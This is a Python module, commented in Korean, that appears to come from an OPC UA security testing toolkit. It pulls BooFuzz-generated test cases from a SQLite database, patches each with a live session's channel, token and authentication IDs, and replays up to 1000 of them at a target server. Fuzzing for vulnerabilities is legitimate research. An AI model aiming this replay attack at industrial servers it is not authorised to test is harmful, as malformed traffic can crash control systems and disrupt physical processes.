# BooFuzz를 활용한 OPCUA 페이로드 공격
#   SQLite 데이터베이스에 저장된 패킷 정보를 사용하여 OPCUA 서버로 페이로드를 전송하는 공격입니다.
#   BooFuzz 네트워크 퍼저로 캡처된 패킷을 서버에 전송합니다.
#
# CVEs:
#   - CVE 관련 내용은 없지만, BooFuzz는 다양한 프로토콜의 취약점을 찾기 위해 사용됩니다.

import datetime
import sqlite3

from protocol import *
from config import *

# SQLite 데이터베이스에서 페이로드 리스트를 가져오는 함수
#   db_file_name: SQLite 파일 경로
#   number_of_payloads: 가져올 페이로드의 개수
def get_list_of_payloads(db_file_name, number_of_payloads):
    result_list = []
    conn = sqlite3.connect(db_file_name)
    cursor = conn.execute("SELECT test_case_index FROM steps ORDER BY test_case_index DESC LIMIT 1")
    test_case_max_num = list(cursor)[0][0]  # 테스트 케이스 최대 인덱스 확인
    print("[-] Found {test_case_max_num} test cases".format(test_case_max_num=test_case_max_num))
    
    # 각 테스트 케이스마다 페이로드를 추출
    for test_case in range(1, test_case_max_num):
        cursor = conn.execute("SELECT data FROM steps WHERE test_case_index = {} AND type = 'send'".format(test_case))
        bd_list = list(cursor)
        try:
            # 최소 5개의 메시지 필요 (4번째 메시지가 페이로드임)
            if len(bd_list) >= 5:
                result_list.append(bd_list[4][0])  # PAYLOAD 추출
            else:
                print("Warning: Failed adding test case {}, number of messages in test {} (should be at least 5)".format(test_case, len(bd_list)))
        except Exception as e:
            print("[X] Failed adding test case {}, number of messages in test {}".format(test_case, len(bd_list)))
    
    return result_list

# 서버에 특정 페이로드를 전송하는 함수
#   server_details: 서버 세부 정보 (프로토콜 타입, IP 주소, 포트 등)
#   payload: 전송할 페이로드
def send_message_from_payload(server_details, payload):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 메시지 준비
    payload = bytearray(payload)
    payload[8:12] = struct.pack("<I", opcua.secure_channel_id)  # 보안 채널 ID 설정
    payload[12:16] = struct.pack("<I", opcua.secure_token_id)  # 보안 토큰 ID 설정
    payload[28:len(OBJECT.build(opcua.auth_id))] = OBJECT.build(opcua.auth_id)  # 인증 ID 추가

    print("[-] Sending OPCUA payload with len {} bytes".format(len(payload)))
    opcua.send_recv(payload, 1, should_recv=False)
    time.sleep(0.01)

    # 연결 종료
    print("[-] Closing connection")
    try:
        opcua.close()
    except Exception as e:
        print(e)

# BooFuzz에서 캡처된 페이로드를 서버로 전송하는 함수
#   db_file_path: SQLite 데이터베이스 파일 경로
def attack_boofuzz_payload(server_details, db_file_path):
    corpus_list = get_list_of_payloads(db_file_path, 1000)  # 최대 1000개의 페이로드 추출
    for i, payload in enumerate(corpus_list):
        print("--------------------")
        print("[-] Payload {} of {} total files".format(i + 1, len(corpus_list)))
        send_message_from_payload(server_details, payload)
